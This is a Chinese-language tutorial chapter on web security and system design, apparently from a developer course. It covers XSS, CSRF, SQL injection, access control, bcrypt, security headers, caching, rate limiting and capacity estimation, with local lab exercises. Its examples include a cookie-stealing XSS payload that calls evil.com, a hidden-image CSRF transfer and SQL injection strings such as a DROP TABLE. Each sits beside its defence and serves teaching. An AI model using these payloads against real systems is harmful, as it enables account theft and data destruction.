7.1简介与阅读指引

定位

这一阶段是两件事的合体：安全（别人怎么攻击你、你怎么防）与系统设计（流量大了怎么扛）。它们共同点都是"在真实约束下做权衡"——安全是在"便利 vs 风险"之间权衡，系统设计是在"成本 vs 承载"之间权衡。

痛点

初学者对安全的典型误区："我的小网站没人攻击"。事实上全网爬虫与漏洞扫描器 7×24 小时扫所有公网 IP，新站上线几小时内就会收到各种探测请求。系统设计的典型误区："一开始就上微服务"——过度设计比设计不足更常见。

前置知识

  • 阶段 3 的后端基础（安全攻击都发生在请求链路上）；
  • 阶段 4 的 Redis（多级缓存与限流要用）；
  • 01 模块的《前端安全：XSS与CSRF》是本篇安全半场的展开版。

阅读指引

  • 主线必读：7.2（四大攻击的攻防）→ 7.3（密码）→ 7.5（分层与缓存）；
  • 第一遍可跳过：7.6 的雪花算法细节与容量预估公式；

学习目标：读完本阶段你能

  1. 亲手复现 XSS / CSRF / SQL 注入，并说出每种攻击的根因与对应的防御层；

7.2Web 攻击面：XSS / CSRF / SQL 注入 / 越权

XSS 跨站脚本：别人的代码在你的页面上运行

攻击者把恶意脚本注入到网页里，浏览器执行后偷用户数据。根因：把不可信数据当成了代码。三种类型：

类型原理例子发生位置
存储型恶意脚本存到数据库，所有访问者都中招评论区发 <script>偷cookie</script>服务端 + 客户端
反射型脚本在 URL 参数里，服务器"反射"给当前用户钓鱼链接 ?q=<script>...</script>服务端
DOM 型纯前端 JS 把不可信内容写进页面，不经过服务器location.hash 直接 innerHTML客户端

攻防演示（在 7.7 可动手）——同一功能的危险写法与安全写法：

// ❌ 危险：innerHTML 把用户输入当代码解析
commentList.innerHTML += '<div>' + userComment + '</div>';
// 用户评论：<img src=x onerror="fetch('//evil.com?c='+document.cookie)">
// 图片加载失败触发 onerror，cookie 就被偷走了

// ✅ 安全：textContent 把用户输入当纯文本
const div = document.createElement('div');
div.textContent = userComment;          // 无论输入什么，都只是文字
commentList.appendChild(div);

// ✅ 富文本场景（必须保留格式时）：白名单过滤，而不是黑名单替换
// 用 DOMPurify 之类的库：只允许 <b><i><a href> 等白名单标签，其余全部剥掉
💡 防御三板斧：① 输出到 HTML 时转义（< → &lt;）——textContent 天然做到；② 富文本用白名单过滤（黑名单永远有漏）；③ 加 CSP 响应头禁止执行未授权脚本（见 7.4）。

CSRF 跨站请求伪造：借你的身份发请求

你登录了银行网站，再访问一个恶意网站，恶意网站偷偷用你的身份发请求转钱。根因：浏览器会自动带上 Cookie，而服务端只认 Cookie 不认请求来源。

<!-- 恶意网站的全部代码可以就这么一行： -->
<img src="https://bank.com/transfer?to=hacker&amount=10000" style="display:none">
<!-- 浏览器把它当图片请求，自动带上 bank.com 的登录 Cookie -->

// ✅ 防御一：CSRF Token——表单里埋一个服务端发的随机串
<form method="POST" action="/transfer">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
</form>
// 服务端校验：请求里的 token 与 Session 里的不一致 → 拒绝
// 恶意网站拿不到这个随机串（同源策略限制），伪造的请求必然校验失败

// ✅ 防御二：Cookie 加 SameSite
Set-Cookie: session=xxx; SameSite=Lax; HttpOnly; Secure
// Lax：跨站的 POST 请求不带 Cookie（GET 导航仍带，兼容外链跳转）
💡 防御清单：① 关键操作带 CSRF Token；② Cookie 设 SameSite=Lax；③ 敏感操作二次确认（验证码/再输密码）；④ 校验 Origin/Referer 头。现代框架（Django/Spring Security）默认内置，别自己关掉。

SQL 注入：用户输入变成了 SQL 代码

根因与 XSS 同构：把不可信数据当代码执行——只不过执行位置在数据库：

// ❌ 危险写法：字符串拼接
sql = "SELECT * FROM users WHERE name='" + name + "' AND pass='" + pass + "'"
// 用户输入 name：' OR '1'='1 --
// 拼出来：SELECT * FROM users WHERE name='' OR '1'='1' --' AND pass='...'
// '1'='1' 永远为真，-- 注释掉后面——不用密码直接登录

// 更狠的：'; DROP TABLE users; --   直接删库

// ✅ 防御：预编译语句（参数化查询）——值永远不参与 SQL 语法解析
db.prepare('SELECT * FROM users WHERE name = ? AND pass = ?').get(name, pass);
// ORM（MyBatis 用 #{}、Sequelize/Prisma）默认就是参数化的，别手写拼接

// ⚠️ 输入校验只是辅助：黑名单过滤 ' OR 之类的关键词，绕过方式无穷多
//    白名单校验格式（手机号 11 位数字）有价值，但替代不了预编译

越权：登录了，但不该看的数据也看了

攻击说明复现方式防御
水平越权用户 A 改了 URL 里的 id，看到了用户 B 的数据/api/orders/1001 手动改成 1002每次查数据都校验"这条数据属于当前登录用户吗"：WHERE id=? AND user_id=?
垂直越权普通用户访问了管理员接口直接请求 /api/admin/delete接口加权限校验（RBAC：角色→权限→接口三层映射）
⚠️ 越权是实战中最高频的漏洞：登录态大家都做了，但"每条数据都校验归属"经常漏——尤其是"前端藏了按钮但后端没拦"的情况。记住：前端隐藏只是 UI，后端校验才是安全。

7.3密码安全与认证设计

🚨 绝对不能明文存密码，也不能自己写 MD5（彩虹表一撞就出来）。正确做法：bcrypt——自带随机盐、计算慢，就算数据库泄露攻击者也破解不动。
// 注册：hash 一次（saltRounds=10，成本因子，机器快了可以调大）
const hash = await bcrypt.hash(password, 10);
// hash 长这样：$2b$10$N9qo8uLOickgx2ZMRZoMye...（算法+成本因子+盐+哈希，全在一起）

// 登录：compare 而不是再 hash 一次对比——盐在 hash 里，compare 自动取
const ok = await bcrypt.compare(inputPassword, storedHash);

// 为什么 bcrypt 安全：
// ① 每次哈希自动带随机盐——两个用户密码相同，库里存的也不同 → 彩虹表失效
// ② 故意慢（成本因子可调）——你登录一次 100ms 无感，攻击者每秒只能试几十次
// ③ 对比：MD5 一台普通显卡每秒能算几十亿次

认证方案怎么选

方案原理优点代价适用
Session + Cookie服务端存会话，Cookie 只放会话 ID可随时踢人下线服务端要存状态，集群要共享传统单体应用
JWT签名的自包含令牌，服务端不存无状态、天然跨服务签发后无法撤销（只能等过期）前后端分离 / 微服务
JWT + Refresh Token短效 JWT + 长效刷新令牌兼顾无状态与可控复杂度增加对安全要求高的分离架构

无论哪种：Cookie 一律 HttpOnly（JS 读不到，防 XSS 偷）+ Secure（只走 HTTPS）+ SameSite（防 CSRF）。

7.4CSP 与安全响应头

这些是零代码成本的防线——加几个响应头，整类攻击的伤害直接减半：

响应头作用示例
Content-Security-Policy声明页面只能加载哪些来源的脚本/样式，浏览器拦截白名单外的——XSS 的第二道防线（就算注入成功也执行不了）default-src 'self'; script-src 'self' cdn.example.com
X-Content-Type-Options禁止浏览器猜文件类型（MIME 嗅探）nosniff
X-Frame-Options禁止被 iframe 嵌套——防点击劫持DENY 或 SAMEORIGIN
Strict-Transport-Security强制浏览器之后都走 HTTPSmax-age=31536000; includeSubDomains
Referrer-Policy控制外链请求带多少来源信息，防泄漏strict-origin-when-cross-origin

CSP 的取舍：太严会拦掉正常脚本（调试成本），太松形同虚设。建议从 script-src 'self' 'nonce-随机串' 开始，逐步收紧；上线前用浏览器的控制台警告把违规项清干净。

7.5系统设计：分层架构与多级缓存

后端分层架构

一个项目不要把所有代码堆在一个文件里。按职责分三层：

💡 依赖方向：Controller → Service → DAO，反向不能调。Controller 不写业务逻辑，Service 不写 SQL，DAO 不拼 HTTP。这样改业务不用动接口层，换数据库不用动业务层。

多级缓存：让请求最远处在最外层就被挡住

数据查询一层层挡，最前面挡住了就不往后走，数据库压力最小：

每层速度差 10~100 倍：浏览器缓存命中 = 0ms；CDN = 10ms 级；Redis = 1ms 级；DB = 10~100ms 级。缓存层级设计的全部目标：让 99% 的请求止步于前两层。每层都要考虑失效策略（对应阶段 4 的缓存三大问题）。

7.6系统设计：分布式 ID / 限流降级熔断 / 容量预估

分布式 ID（雪花算法）

分库分表后，自增 ID 会冲突。雪花算法用 64 位数字生成全局唯一 ID：

0 | 41位时间戳 | 10位机器ID | 12位序列号
  • 时间戳：能算出自增趋势（对数据库索引友好）；
  • 机器 ID：不同机器不冲突（10 位 = 1024 台）；
  • 序列号：同一毫秒内多个 ID 递增（12 位 = 每毫秒每机器 4096 个）。

对比方案：UUID v4 完全随机（无序，做主键会导致 B+ 树频繁分裂，见阶段 4）；数据库号段模式（批量取一段，依赖 DB）。雪花算法是"趋势递增 + 无中心依赖"的平衡解。

限流 / 降级 / 熔断：压力下的三件套

手段什么时候用干什么实现举例
限流防打挂自己超过 QPS 就拒绝请求计数器 / 令牌桶：每秒只放 1000 个，其余返回 429
降级非核心功能拖累主流程推荐接口关了，下单还能用配置开关 + 兜底数据（"推荐位暂时不可用"）
熔断下游服务持续超时直接短路，不再调，等一会再试错误率超阈值就"跳闸"，半开状态探测恢复
💡 思路：系统要能在压力下"优雅地少做事"，而不是直接崩掉。保核心链路，牺牲边缘功能。三者常组合：限流挡住过量流量 → 降级关闭边缘功能 → 熔断隔离故障下游。

容量预估：上线前先算一笔账

  • QPS 估算：日活 × 人均请求数 ÷ 86400 = 平均 QPS，峰值按 3~5 倍（早晚高峰集中）；
  • 单机承载：压测一台机器能扛多少 QPS，集群数 = 峰值 QPS ÷ 单机 × 冗余系数（≥2）；
  • 数据库：慢查询别拖，连接池大小 ≈ 核数 × 2 + 磁盘数（经验起点，压测调优）；
  • 内存/磁盘/带宽：按峰值留 2 倍余量；带宽 = 峰值 QPS × 平均响应大小。

举例：日活 10 万、人均 50 请求 → 平均 QPS ≈ 58，峰值按 5 倍 ≈ 300。压测单机 200 QPS → 至少 2 台（含冗余）。这个数量级用 1 台 2C4G + 1 台备份就够了——容量预估的另一个作用是阻止过度设计。

7.7最小可运行实验

实验一：亲手注入一次 XSS，再防住它

<!-- xss.html：保存后用浏览器打开 -->
<div id="box"></div>
<script>
  const input = '<img src=x onerror="alert(\'XSS!\')">';  // 模拟恶意评论
  // ❌ 危险：innerHTML 会把字符串当代码，图片加载失败触发 alert
  document.getElementById('box').innerHTML = input;
</script>

运行看到弹窗，就是 XSS 成功。然后把 innerHTML = input 改成 textContent = input——刷新，弹窗没了，页面上显示的是这段字符串本身。这一个实验就是 XSS 攻防的全部本质：数据 vs 代码。

实验二：SQL 注入与预编译

// sqlite-inject.js —— npm i better-sqlite3
const Database = require('better-sqlite3');
const db = new Database(':memory:');
db.exec("CREATE TABLE users (name TEXT, pass TEXT)");
db.prepare("INSERT INTO users VALUES ('tom','123')").run();

const name = "' OR '1'='1 --";       // 攻击输入

// ❌ 拼接：注入成功，返回全部用户
const bad = db.prepare("SELECT * FROM users WHERE name='" + name + "'").all();
console.log('拼接：', bad.length, '条');      // 1 条（全部用户）

// ✅ 参数化：输入只是数据
const good = db.prepare('SELECT * FROM users WHERE name = ?').all(name);
console.log('参数化：', good.length, '条');   // 0 条

实验三：60 行写一个限流器

// ratelimit.js —— 固定窗口计数器（最简单的限流算法）
const buckets = new Map();
function allow(ip, limit = 5, windowMs = 10000) {
  const now = Date.now();
  const b = buckets.get(ip);
  if (!b || now - b.start > windowMs) {     // 窗口过期，重置
    buckets.set(ip, { start: now, count: 1 });
    return true;
  }
  if (b.count >= limit) return false;       // 超限拒绝（返回 429）
  b.count++;
  return true;
}
// 模拟：同一个 IP 连发 8 次，前 5 次放行，后 3 次拒绝
let pass = 0, reject = 0;
for (let i = 0; i < 8; i++) allow('1.2.3.4') ? pass++ : reject++;
console.log(`放行 ${pass}，拒绝 ${reject}`);   // 放行 5，拒绝 3

生产里把它接到 Express 中间件即可（app.use((req,res,next)=> allow(req.ip) ? next() : res.status(429).end())）。进阶方向：滑动窗口 / 令牌桶（更平滑），以及用 Redis 做集群级共享计数。

7.8重点讲解

Q1：XSS 和 CSRF 有什么区别？各自防的是什么？

参考答案：攻击方向完全不同。

XSS 是"注入"攻击：攻击者把恶意代码放进你的网站，在你的页面上执行——本质是"数据被当成代码"。危害发生在你的域内（偷 Cookie、改页面、伪装用户操作）。防御核心：转义/白名单（不让数据变代码）+ CSP（就算注入也执行不了）+ HttpOnly Cookie（偷了也没用）。

CSRF 是"伪造"攻击：攻击者根本不需要注入任何东西，他借用户的登录态从自己的网站发请求——本质是"服务端只认 Cookie 不认来源"。防御核心：CSRF Token（恶意网站拿不到随机串）+ SameSite Cookie（跨站不带）+ 敏感操作二次确认。

一句话总结：XSS 偷的是"你的页面上的权限"，CSRF 借的是"用户浏览器里的登录态"。所以两者防御层也不同：XSS 防在输出与执行层，CSRF 防在请求来源层。

延伸：有了 XSS 往往能连锁打出 CSRF（在受害者页面上用 JS 直接发合法请求），所以 XSS 是更上游的威胁，优先级更高。

Q2：为什么"先加密再传密码"不能替代 bcrypt？HTTPS 已经加密了啊？

参考答案：两者保护的对象不同。

HTTPS 保护的是传输过程（防窃听防篡改）；bcrypt 保护的是存储（数据库泄露后密码不暴露）。传输再安全，数据库一旦泄露（拖库、内部人员、备份丢失），明文/弱哈希密码全部暴露——而用户在其他网站复用同一密码，损失会连锁放大。

bcrypt 的设计就是把"离线破解成本"拉高：随机盐让彩虹表失效（每个用户都要单独算），可调成本因子让硬件进步失效（机器快了就调大参数）。

延伸：前端 hash 一次再传也不是替代——传输层安全靠 HTTPS；而且前端 hash 的结果就是"新密码"，泄露后照样直接登录（pass-the-hash）。

Q3：限流算法有哪几种？固定窗口有什么问题？

参考答案：常见三种。

① 固定窗口计数器（7.7 实验三）：实现最简单，但有临界突刺——上一个窗口的最后 1 秒和下一个窗口的第 1 秒加起来可能放行 2 倍流量。
② 滑动窗口：把窗口切成小格或记录时间戳队列，统计"最近 N 秒"，消除临界突刺，内存成本略高。
③ 令牌桶：匀速往桶里放令牌，请求拿令牌才放行——允许一定突发（桶里积攒的令牌可一次用掉），最接近真实业务的"平均限速 + 容忍脉冲"需求。

延伸：单机用内存计数即可；集群限流要共享计数（Redis INCR + EXPIRE 或令牌桶 Lua 原子脚本）。限流返回 429 并给 Retry-After 头，让客户端礼貌退避。

Q4：系统设计题——"设计一个短链接服务"，从安全与架构角度怎么答？

参考答案（答题骨架）：

① 接口与数据：POST /shorten 传长 URL 返回短码；GET /:code 302 跳转。存储：短码 → 长 URL 的 KV 映射，短码用发号器生成（阶段 8 的分布式 ID 或 base62 编码自增 ID）。
② 分层：Controller 校验 URL 合法性（防 SSRF：拒绝内网地址）→ Service 查缓存/生成 → DAO 存储。
③ 缓存：热点短码放 Redis（读多写少，天然的缓存场景），命中率低的长尾落库；跳转是当前读，无一致性问题。
④ 安全：短链可被用于钓鱼/绕过审核——生成时校验目标域名黑名单；跳转前加确认页或威胁情报查询；限流防刷（每 IP 每分钟 N 次生成）。
⑤ 容量：读远多于写（读写比 ~100:1），多级缓存后 DB 几乎无压力；短码 6~7 位 base62 可覆盖百亿级。

要领：把本阶段的关键词（分层、缓存、限流、ID 生成、容量估算）自然嵌进一个具体业务，比背八股有说服力得多。
